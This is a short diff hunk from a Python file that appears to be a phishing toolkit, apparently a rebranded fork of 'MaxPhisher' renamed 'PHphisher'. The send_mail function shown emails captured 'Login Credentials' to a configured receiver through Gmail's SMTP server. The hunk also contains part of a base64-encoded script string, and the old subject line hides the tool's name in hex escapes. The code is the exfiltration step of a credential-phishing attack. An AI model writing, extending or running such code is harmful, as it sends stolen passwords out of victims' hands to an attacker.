@@ -659,7 +659,7 @@ encoded_script = "aWYgc2hhMjU2KGF1dGhvci5lbmNvZGUoInV0Zi04IikpLmhleGRpZ2VzdCgpIC
 
 def send_mail(msg):
     global email, password, receiver
-    message = f"From: {email}\nTo: {receiver}\nSubject: \x4d\x61\x78\x50\x68\x69\x73\x68\x65\x72 Login Credentials\n\n{msg}"
+    message = f"From: {email}\nTo: {receiver}\nSubject: PHphisher Login Credentials\n\n{msg}"
     try:
         internet()
         with smtp('smtp.gmail.com', 465) as server:
